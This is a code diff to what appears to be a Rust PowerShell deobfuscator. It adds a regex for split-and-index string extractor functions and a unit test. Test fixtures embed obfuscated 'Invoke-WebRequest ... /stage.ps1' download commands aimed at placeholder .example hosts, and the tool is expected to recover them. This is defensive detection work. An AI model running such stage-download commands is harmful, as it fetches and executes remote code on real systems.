@@ -1111,6 +1111,14 @@ static PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)?\s*\[\s*(\d{1,6})\s*\]"#,
+    )
+    .expect("ps literal const split operator index extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3812,7 +3820,10 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
             continue;
         }
 
-        let Some(caps) = PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE.captures(&body) else {
+        let Some(caps) = PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE
+            .captures(&body)
+            .or_else(|| PS_LITERAL_CONST_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE.captures(&body))
+        else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
@@ -9053,6 +9064,23 @@ Piece -value 'noise|Invoke-WebRequest -Uri https://ps-const-split-named-arg.exam
                 "'Invoke-WebRequest -Uri https://ps-const-split-named-arg.example/stage.ps1'"
             ),
             "constant split-index named-arg extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_split_operator_index_extractor_call_is_rewritten() {
+        let text = r#"function Piece($value) {
+  return ($value -split '|')[1]
+}
+Piece 'noise|Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1|tail'"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1'"
+            ),
+            "constant split-operator extractor call was not rewritten:\n{out}"
         );
     }
 
